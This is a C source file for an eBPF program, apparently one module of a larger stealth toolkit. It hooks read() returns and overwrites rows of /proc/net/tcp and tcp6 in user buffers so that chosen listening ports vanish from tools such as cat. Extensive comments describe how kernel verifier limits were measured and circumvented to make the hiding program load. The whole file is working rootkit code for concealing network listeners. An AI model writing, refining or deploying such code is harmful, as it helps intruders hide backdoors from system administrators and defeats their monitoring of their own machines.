// tc_rewrite.c — hide listening ports from readers of /proc/net/tcp{,6}
//
// Hook : tracepoint/syscalls/sys_exit_read    (BPF_PROG_TYPE_TRACEPOINT)
// Maps : hidden_ports   (shared, declared in common.h — no extra maps)
//
// ===========================================================================
// WHY THIS MODULE DOES NOT USE kretprobe/tcp4_seq_show  (both blockers measured
// on the live kernel — see the Phase 2a report)
// ===========================================================================
// The requested design was `SEC("kretprobe/tcp4_seq_show")` + space-filling the
// seq_file's kernel buffer.  Two independent facts make that impossible:
//
//  (1) THE ARGUMENTS ARE GONE AT RETURN PROBE TIME.
//      A kretprobe handler's pt_regs hold the *return-time* register values.
//      Measured with a kretprobe on tcp4_seq_show that printed
//      PT_REGS_PARM1(ctx):
//          bpf_trace_printk: AXTEST seq=NULL      (every invocation)
//      so `seq` cannot be recovered that way.  (Register arguments are only
//      guaranteed at *entry* probes.)
//
//  (2) BPF CANNOT WRITE KERNEL MEMORY AT ALL.
//      `bpf_probe_write_user` is the only memory-write helper that exists, and
//      it enforces access_ok(), which rejects kernel addresses.  Measured:
//          bpf_trace_printk: AXW kwrite_ret=-14   <- -EFAULT, kernel address
//          bpf_trace_printk: AXW uwrite_ret=0     <- user address, works
//      The seq_file buffer is kvmalloc'd kernel memory, so space-filling it
//      from BPF is not possible on any kernel, regardless of hook point.
//
// The equivalent that *is* achievable: hook the read() that delivers the
// already-rendered table to userspace and blank the matching rows in the
// USER buffer, which bpf_probe_write_user can write.  Same observable result
// for `cat`, `head`, `less`, shell redirection and anything else that reads
// the file; `ss` remains unaffected because it uses Netlink INET_DIAG rather
// than /proc (out of scope, as the spec noted).
//
// The syscall arguments (fd, user buffer) are recovered from the current
// task's pt_regs exactly as in hide.c — sys_exit_* tracepoints do not carry
// args[]; see hide.c for the full explanation.
//
// ===========================================================================
// WHAT THE REWRITE LOOKS LIKE
// ===========================================================================
//   v4 row: `   0: 0100007F:1F90 00000000:0000 0A ...`
//                              ^ port
//   The local port is the 4 hex digits AFTER the second ':' — the one that
//   closes local_address, NOT the 4 digits before it (those are the last two
//   octets of the address: every 127.0.0.1 row ends in "007F").
//
//   On a match 64 bytes are space-filled starting 4 bytes before the port:
//
//     `   0: 0100007F:1F90 00000000:0000 0A ...`   ->   `   0: 0100      ... `
//                        \______ 64 spaces ______/
//
//   The port — the thing this module exists to hide — is gone, along with the
//   rest of the local address, the whole remote address/port and the socket
//   state.  The first four octets of the local address survive, and the '\n'
//   is never written, so the file keeps its line structure and its line count.
//
//   Blanking from the ROW START instead was the original design and looks
//   tidier, but it needs a running '\n' cursor across the scan; that cursor is
//   a scalar the verifier tracks precisely, it differs on every iteration, and
//   it therefore stops the loop's states from merging — the cost showed up as
//   `total_states` and processed-instruction growth, not as anything a reader
//   would see.  Given a choice between a byte-range nicety and a program that
//   loads, the program that loads wins.  Blanking 64 bytes from `k - 4` can
//   never reach back past the previous row's '\n' either, so line counts are
//   stable in every case.
//
// ===========================================================================

#undef __VMLINUX_H__   /* see hide.c: neutralise the pipeline's -D__VMLINUX_H__ */

#include "common.h"

#define AX_THREAD_SIZE  16384UL   /* x86_64, 4 KiB pages */

/* Bounded scan budget: one read() of a /proc seq file is at most one seq
 * buffer (4 KiB by default), and `cat`-sized reads never exceed that.
 *
 * 3072, not 4096, is a measured verifier boundary, not a preference: the
 * verifier walks this scan loop position by position (16 x 57 = 912 body
 * walks at the 1 KiB figure, all of them logged), so the window is a direct
 * multiplier on both verifier budgets.  Swept on the live kernel with
 * everything else identical:
 *
 *      4096 -> "BPF program is too large. Processed 1000001 insn"
 *      3072 -> loads
 *      2048 -> loads
 *      1024 -> loads
 *
 * Coverage: any /proc/net/tcp{,6} table up to 3 KiB is rewritten. */
#define AX_MAX_SCAN     3072
/* Bytes fetched per probe_read.  Constant, always — see the block comment. */
#define AX_CHUNK        64
/* The port field is ":XXXX " and is checked against the 2 hex digits in front
 * of it, so the scan stops 5 bytes short of the end of the chunk. */
#define AX_SCAN_END     (AX_CHUNK - 5)

/* ---------------------------------------------------------------------------
 * WHY THIS PROGRAM IS SHAPED THE WAY IT IS  (measure, do not "simplify")
 * ---------------------------------------------------------------------------
 * Every structural choice below is forced by a measured verifier rejection.
 * In order:
 *
 *  1. "BPF program is too large. Processed 1000001 insn" with the per-row work
 *     inlined into a 4096-byte scan: the verifier explores the expensive branch
 *     at every iteration.  Two passes (boundaries, then rows) fixed that one,
 *     but the row pass still had a search loop over the address width.
 *
 *  2. The same limit from a search loop's EXITS: `for (m = ...) if (...) break;`
 *     costs one verifier state per possible exit point, and because the search
 *     ran once per row inside the row loop, each of those states was then
 *     walked through the entire rest of the program — that nesting alone
 *     produced total_states 21642, peak_states 4489, mark_read 446 at the
 *     limit.  Searching with unrolled selects (no branch) fixed that one, but
 *     the row loop itself was still the problem.
 *
 *  3. ANY conditional stack write that differs between two paths joining at
 *     the same instruction stops those states from merging, because
 *     stacksafe() compares the slot types and a row loop that is sometimes
 *     entered and sometimes skipped leaves a different stack state on each
 *     path.  With 33 macro-expanded row blocks that measured total_states
 *     38695, peak_states 7686 — no better.  So this version has NO row array,
 *     no second pass and no conditional stack writes at all: `spaces` is
 *     written once before anything else and never modified, `chunk` is
 *     rewritten wholesale at the top of each chunk, and both helper sizes are
 *     constants.
 *
 *  4. Helper size arguments must be provably non-zero *to the verifier*, which
 *     only reads the instruction's tnum; it cannot use what LLVM knows (a
 *     plain `if (x == 0) x = 1;` is deleted by LLVM whenever it can prove
 *     x != 0, leaving "R3 invalid zero-sized read: u64=[0,63]").  Constant
 *     sizes sidestep this entirely: reading a few bytes past `ret` at the very
 *     end of a read() buffer is harmless (the buffer is a page or more in
 *     every real reader) while a variable size is not.
 *
 *  5. "The sequence of 8193 jumps is too complex." IS NOT ABOUT JUMPS IN THE
 *     PROGRAM.  It is emitted by push_stack() in kernel/bpf/verifier.c:
 *
 *         if (env->stack_size > BPF_COMPLEXITY_LIMIT_JMP_SEQ) {
 *             verbose(env, "The sequence of %d jumps is too complex.\n",
 *                     env->stack_size);
 *
 *     env->stack_size is the number of *pending verifier states* on the DFS
 *     stack, capped at 8192.  It is pushed once per conditional jump the
 *     verifier defers, so what matters is the number of conditional jumps
 *     *processed* across the whole exploration — not the static jump count,
 *     which here was only 52.  Two measurements pinned this down:
 *
 *       - halving the scan window (AX_MAX_SCAN 4096 -> 2048) changed the
 *         compiled loop bound but left `processed 101368 insns` and the
 *         failure *byte-identical*, because the outer loop is pruned by the
 *         state cache and the pressure comes from the inner scan;
 *       - disassembling the scan body showed the `ok` test compiled to SIX
 *         backward branches per scan position (`if r2 > r0 goto <next k>` at
 *         insns 297..336) — one per failed `&` term — plus one for the '\n'
 *         select and two in the match path.  ~10 deferred states per position
 *         x 57 positions x every walk of the loop is what overflowed the
 *         8192-entry stack.
 *
 *     THE FIX, and the reason every comparison below is written as arithmetic:
 *     LLVM lowers `a == b` / `a < b` to a **branch** on the BPF target, even
 *     inside a bitwise `&` chain, so any C-level "branchless" test is a lie
 *     unless no comparison survives.  ax_eq/ax_lt/ax_iszero therefore compute
 *     0/1 from shifts and subtracts only — instructions LLVM cannot turn into
 *     a jump.  The syntactic test went from ~6 branches per position to zero.
 *
 *  6. AND THE OPPOSITE FAILURE, which is why the lookup stays behind the test.
 *     With the test branchless the push_stack limit was met, and the next
 *     attempt moved the map lookup OUT of the match test (looking up a
 *     sentinel key at every position) so the hit test would be a single
 *     branch.  That hit "BPF program is too large. Processed 1000001 insn"
 *     with the whole scan unrolled 16 x 57 body walks: hoisting the lookup
 *     gives every position two live states (map-value pointer vs scalar) that
 *     never merge, and the walk goes exponential, while leaving it inside the
 *     test costs one deferred state per position and measured only 62k
 *     instructions.  Halving or quartering the scan window does NOT fix this
 *     shape — with the lookup hoisted, 1024, 2048, 3072 and 4096 all hit the
 *     cap; the body, not the window, is what multiplies.
 *
 *  7. FINALLY, the per-chunk '\n' cursor.  A running "last newline seen" scalar
 *     is tracked precisely across iterations, so two states reaching the loop
 *     head with different cursor values can never merge — that alone kept the
 *     walk at the 1000001-insn cap for every window size.  Removing the cursor
 *     (and blanking from the port instead of the row start) is what finally
 *     cleared it: 2048/3072/1024 then loaded, and the window could be pushed
 *     back up to 3072.
 *
 *  The two limits pull in opposite directions, and the shape below is the only
 *  one measured to satisfy both: a branchless test (no deferred states from
 *  the test), the lookup and write inside it (few live states per position),
 *  no cross-iteration scalar state, and a 3 KiB window (few positions).
 *
 *  Hex decoding is branchless too: (c & 0xf) + 9 * (c >> 6) is correct for
 *  '0'-'9' (c >> 6 == 0) and for 'A'-'F'/'a'-'f' (c >> 6 == 1).
 * --------------------------------------------------------------------------- */

/* Address of the current task's pt_regs (top of its kernel stack). */
static __always_inline struct pt_regs *ax_task_pt_regs(void)
{
    struct task_struct *t = bpf_get_current_task_btf();
    void *stack = NULL;

    if (!t)
        return NULL;
    if (bpf_probe_read_kernel(&stack, sizeof(stack), &t->stack) != 0)
        return NULL;
    if (!stack)
        return NULL;
    return (struct pt_regs *)((char *)stack + AX_THREAD_SIZE) - 1;
}

/* read(): di = fd, si = user buffer (the count is the tracepoint's ret). */
static __always_inline int ax_read_args(__u64 *fd, __u64 *buf)
{
    struct pt_regs *regs = ax_task_pt_regs();

    if (!regs)
        return -1;
    if (bpf_probe_read_kernel(fd, sizeof(*fd), &regs->di) != 0)
        return -1;
    if (bpf_probe_read_kernel(buf, sizeof(*buf), &regs->si) != 0)
        return -1;
    return 0;
}

/* ---- comparison-free predicates -----------------------------------------
 * All three are pure ALU (sub/shift/and/or), so LLVM emits no branch for
 * them.  Argument ranges are small (bytes or < 2^31) which is what makes the
 * shift trick valid. */
static __always_inline __u32 ax_iszero(__u32 x)
{
    return (x - 1u) >> 31;                       /* 1 iff x == 0 */
}

static __always_inline __u32 ax_lt(__u32 x, __u32 n)
{
    return (x - n) >> 31;                        /* 1 iff x < n */
}

static __always_inline __u32 ax_eq(__u32 a, __u32 b)
{
    return ax_iszero(a ^ b);                     /* 1 iff a == b */
}

/* Branchless hex-digit test.  (c | 0x20) folds 'A'-'F' onto 'a'-'f'; the u8
 * cast keeps '0'-'9' from wrapping into that range. */
static __always_inline __u32 ax_ishex(__u8 c)
{
    return ax_lt((__u32)(__u8)(c - '0'), 10u) |
           ax_lt((__u32)(__u8)((c | 0x20) - 'a'), 6u);
}

/* Branchless reject for the ~every-other-read() case: does this buffer look
 * like a /proc/net/tcp{,6} table?
 *
 * A data row is almost entirely hex digits, spaces and colons (every numeric
 * field is hex or decimal, and the separators are spaces), so counting those
 * bytes separates a table row (~60+ of 64) from random or ordinary text
 * (~20-30) with a wide margin.  Deliberately crude: a false accept only costs
 * one wasted scan, while a branchy test is what made this program unloadable
 * (see the block comment above).  Do not "improve" this into early exits. */
static __always_inline int ax_gate(const unsigned char *h)
{
    __u32 n = 0;
    int m;

    for (m = 0; m < AX_CHUNK; m++) {
        __u8 c = h[m];

        n += ax_ishex(c) + ax_eq(c, ' ') + ax_eq(c, ':');
    }
    /* the header row ("  sl  local_address ...") is mostly not hex */
    return (int)((ax_eq(h[0], ' ') & ax_eq(h[1], ' ') & ax_eq(h[2], 's') &
                  ax_eq(h[3], 'l')) |
                 (1u - ax_lt(n, 40u)));
}

SEC("tracepoint/syscalls/sys_exit_read")
int ax_tc_rewrite(struct trace_event_raw_sys_exit *args)
{
    long ret = args->ret;
    __u64 fd = 0, buf = 0;
    unsigned char chunk[AX_CHUNK];
    unsigned char spaces[AX_CHUNK];
    int i, k;

    if (ret <= 0)
        return 0;
    if (ax_read_args(&fd, &buf) != 0 || buf == 0)
        return 0;
    if (ret > AX_MAX_SCAN)
        ret = AX_MAX_SCAN;

    /* The blanking source.  Filled once, before any branch, and never written
     * again anywhere in this program: a stack buffer that some paths modify
     * and others do not is what stops verifier states from merging (see the
     * block comment above). */
    __builtin_memset(spaces, ' ', sizeof(spaces));

    __builtin_memset(chunk, 0, sizeof(chunk));
    if (bpf_probe_read_user(chunk, AX_CHUNK, (void *)buf) != 0)
        return 0;
    if (!ax_gate(chunk))
        return 0;

    for (i = 0; i < AX_MAX_SCAN / AX_CHUNK; i++) {
        __u64 base = (__u64)i * AX_CHUNK;

        if (base >= (__u64)ret)
            break;

        /* Rewritten wholesale at the top of the iteration, before the scan:
         * every path through the scan below sees the same stack state. */
        __builtin_memset(chunk, 0, sizeof(chunk));
        if (bpf_probe_read_user(chunk, AX_CHUNK, (void *)(buf + base)) != 0)
            break;

        /* ROLLED, and unrolling is disabled explicitly — this is load-bearing.
         * Unrolled, each scan position carried its own branches into the CFG
         * and the verifier's pending-state stack overflowed (see point 5 in the
         * block comment).  Rolled, one copy of the body serves any scan width.
         *
         * `k` stays a bounded induction variable (2..58), so every
         * chunk[k +/- n] offset is provably inside the 64-byte buffer and the
         * verifier still bounds-checks each load. */
        #pragma clang loop unroll(disable)
        for (k = 2; k < AX_SCAN_END; k++) {
            __u64 at;
            __u32 mt;
            __u16 v;
            void *p;

            /* ':XXXX ' preceded by two hex digits — every term is arithmetic,
             * so this whole test is a couple of ALU ops and no branch.  The two
             * digits in front keep the match off colons that are not the local
             * address's (": " after the sl counter, "tm->when" in the header);
             * the map lookup settles the rest — the remote address's ':' decodes
             * to its own port and simply is not in the map. */
            mt = ax_eq(chunk[k], ':') & ax_ishex(chunk[k - 2]) &
                 ax_ishex(chunk[k - 1]) & ax_ishex(chunk[k + 1]) &
                 ax_ishex(chunk[k + 2]) & ax_ishex(chunk[k + 3]) &
                 ax_ishex(chunk[k + 4]) & ax_eq(chunk[k + 5], ' ');
            /* no match at the very front of the buffer: at == k-4 would point
             * before it */
            mt &= 1u - (__u32)(((__u64)base + (__u64)k - 4ull) >> 63);

            /* branchless hex decode of the four digits after the ':' */
            v = (__u16)((((chunk[k + 1] & 0xf) + 9 * (chunk[k + 1] >> 6)) << 12) |
                        (((chunk[k + 2] & 0xf) + 9 * (chunk[k + 2] >> 6)) << 8) |
                        (((chunk[k + 3] & 0xf) + 9 * (chunk[k + 3] >> 6)) << 4) |
                         ((chunk[k + 4] & 0xf) + 9 * (chunk[k + 4] >> 6)));

            /* The map lookup stays INSIDE the match test.  Measured: hoisting
             * it out (looking up a sentinel key at every position, to save a
             * branch) is far worse than the branch it saves — every position
             * then ends in two live states (pointer vs scalar) that never
             * merge, and the walk exploded from 62k to the 1000001-insn cap
             * with the loop fully unrolled 16 x 57 times.  One deferred state
             * per position is affordable; two are not. */
            if (mt != 0) {
                p = bpf_map_lookup_elem(&hidden_ports, &v);
                if (p) {
                    /* Blank from 4 bytes before the port: that removes the last
                     * two octets of the local address, the port itself and the
                     * whole remote address/port.  See the header comment — the
                     * row start would need a running per-chunk '\n' cursor, and
                     * that cursor is a precisely-tracked scalar that changes
                     * every iteration, which stops the verifier's states from
                     * merging and costs more than the extra bytes hide. */
                    at = (__u64)(k - 4);

                    bpf_probe_write_user((void *)(buf + base + at), spaces,
                                         AX_CHUNK);
                }
            }
        }
    }

    return 0;
}

char LICENSE[] SEC("license") = "GPL";
